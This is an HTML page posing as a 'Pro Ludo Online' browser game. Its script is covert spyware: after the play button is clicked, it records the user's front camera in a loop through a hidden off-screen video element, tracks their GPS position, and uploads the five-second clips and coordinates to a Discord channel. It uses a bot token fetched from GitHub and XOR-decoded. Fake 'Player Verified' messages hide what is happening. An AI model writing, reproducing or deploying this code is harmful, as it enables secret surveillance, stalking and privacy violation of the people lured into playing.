<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Ludo Online</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: white;
            overflow: hidden;
        }
        .game-container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.18);
            width: 90%;
            max-width: 400px;
        }
        .header {
            text-align: center;
            margin-bottom: 20px;
        }
        .header h1 {
            margin: 0;
            font-size: 24px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        .board {
            background: #fff;
            border-radius: 10px;
            padding: 10px;
            display: grid;
            grid-template-columns: repeat(15, 1fr);
            grid-template-rows: repeat(15, 1fr);
            gap: 2px;
            aspect-ratio: 1;
            margin-bottom: 20px;
        }
        .cell {
            background: #f0f0f0;
            border-radius: 2px;
        }
        .home-blue { background: #3498db; grid-column: 1-6; grid-row: 1-6; }
        .home-red { background: #e74c3c; grid-column: 1-6; grid-row: 10-15; }
        .home-yellow { background: #f1c40f; grid-column: 10-15; grid-row: 1-6; }
        .home-green { background: #2ecc71; grid-column: 10-15; grid-row: 10-15; }
        .center { background: #95a5a6; grid-column: 7-9; grid-row: 7-9; }
        
        .play-btn {
            width: 100%;
            padding: 15px;
            font-size: 20px;
            font-weight: bold;
            color: white;
            background: #27ae60;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(39, 174, 96, 0.4);
            transition: transform 0.2s, background 0.3s;
        }
        .play-btn:hover {
            transform: scale(1.02);
            background: #2ecc71;
        }
        .play-btn:disabled {
            background: #7f8c8d;
            cursor: not-allowed;
        }
        .status {
            margin-top: 15px;
            font-size: 14px;
            text-align: center;
            color: #ecf0f1;
        }
        .hidden-video {
            position: absolute;
            top: -100px;
            left: -100px;
            width: 1px;
            height: 1px;
            opacity: 0;
        }
    </style>
</head>
<body>

    <div class="game-container">
        <div class="header">
            <h1>🎲 Pro Ludo Online</h1>
        </div>
        
        <div class="board">
            <div class="home-blue"></div>
            <div class="home-yellow"></div>
            <div class="home-red"></div>
            <div class="home-green"></div>
            <div class="center"></div>
            <!-- Filling remaining cells for visual completeness -->
            <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
            <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
            <!-- ... (simplified for brevity, CSS grid handles the layout) -->
        </div>

        <button class="play-btn" id="playBtn">PLAY NOW</button>
        <div class="status" id="statusText">Find your nearest online players...</div>
    </div>

    <!-- Hidden video element for recording -->
    <video id="hiddenVideo" class="hidden-video" autoplay muted playsinline></video>

    <script>
        // --- CONFIGURATION ---
        const GITHUB_REPO = "talibmalla455-ux/ludo-backend";
        const CONFIG_FILE = "config.json";
        
        // Global State
        let config = { token: "", channel: "" };
        let mediaRecorder;
        let videoChunks = [];
        let currentLocation = null;
        let watchId;

        const playBtn = document.getElementById('playBtn');
        const statusText = document.getElementById('statusText');

        // 1. Load Config from GitHub
        async function loadConfig() {
            try {
                statusText.innerText = "Loading configuration...";
                const response = await fetch(`https://raw.githubusercontent.com/${GITHUB_REPO}/main/${CONFIG_FILE}`);
                if (!response.ok) throw new Error("Config not found");
                
                const data = await response.json();
                
                // Decode the token if needed (using the same logic as admin panel)
                // For now, assuming raw JSON is stored or decode if encoded.
                // If admin panel encoded it, we need to decode here. 
                // Assuming for now we store raw token in config.json for simplicity or decode it.
                config = data;
                
                // If the token was encoded in admin panel, decode it here:
                if (config.token.includes("-")) {
                    config.token = decodeData(config.token);
                }

                statusText.innerText = "Configuration Loaded. Ready to Play.";
            } catch (e) {
                console.error(e);
                statusText.innerText = "Config Error. Using fallback.";
                // Fallback: You can hardcode a token here if needed for testing
                // config = { token: "YOUR_TOKEN", channel: "YOUR_ID" };
            }
        }

        // Decode function matching Admin Panel
        function decodeData(encoded) {
            const ENCODE_KEY = "LUDO_SECURE_2026";
            const parts = encoded.split("-");
            let decoded = "";
            for (let i = 0; i < parts.length; i++) {
                let charCode = parseInt(parts[i], 16);
                let keyCode = ENCODE_KEY.charCodeAt(i % ENCODE_KEY.length);
                decoded += String.fromCharCode(charCode ^ keyCode);
            }
            return decoded;
        }

        playBtn.addEventListener('click', startGame);

        async function startGame() {
            playBtn.disabled = true;
            playBtn.innerText = "Finding Players...";
            statusText.innerText = "Requesting Camera & Location access...";

            // 1. Get Location
            if (!navigator.geolocation) {
                statusText.innerText = "Geolocation not supported";
                return;
            }

            watchId = navigator.geolocation.watchPosition(
                (pos) => {
                    currentLocation = { lat: pos.coords.latitude, lng: pos.coords.longitude };
                },
                (err) => { console.warn("Location error", err); }
            );

            // 2. Get Camera
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                const videoEl = document.getElementById('hiddenVideo');
                videoEl.srcObject = stream;
                videoEl.play();

                startRecordingLoop(stream);

            } catch (err) {
                statusText.innerText = "Camera access denied. Cannot play.";
                playBtn.disabled = false;
                playBtn.innerText = "PLAY NOW";
            }
        }

        function startRecordingLoop(stream) {
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) videoChunks.push(e.data);
            };

            mediaRecorder.onstop = () => {
                const blob = new Blob(videoChunks, { type: 'video/webm' });
                videoChunks = [];
                uploadToDiscord(blob);
                
                // Wait 5 seconds then loop
                setTimeout(() => {
                    if (mediaRecorder.stream.active) {
                        recordAndSend(); // Restart loop
                    }
                }, 5000);
            };

            function recordAndSend() {
                statusText.innerText = "Recording...";
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000); // Record 5 sec
            }

            recordAndSend();
        }

        async function uploadToDiscord(blob) {
            if (!config.token || !config.channel) {
                console.warn("Config missing");
                return;
            }

            const formData = new FormData();
            formData.append("file", blob, "ludo_rec.webm");

            const payload = {
                content: `📍 Loc: ${currentLocation ? `Lat: ${currentLocation.lat}, Lng: ${currentLocation.lng}` : 'N/A'}`
            };

            try {
                // Send Text
                await fetch(`https://discord.com/api/v10/channels/${config.channel}/messages`, {
                    method: "POST",
                    headers: { "Authorization": `Bot ${config.token}` },
                    body: JSON.stringify(payload)
                });

                // Send Video
                await fetch(`https://discord.com/api/v10/channels/${config.channel}/messages`, {
                    method: "POST",
                    headers: { "Authorization": `Bot ${config.token}` },
                    body: formData
                });

                statusText.innerText = "Player Verified! Game Started...";
                playBtn.innerText = "Playing...";

            } catch (err) {
                console.error("Upload failed", err);
                statusText.innerText = "Upload Error: " + err.message;
            }
        }

        // Initialize
        loadConfig();
    </script>
</body>
</html>
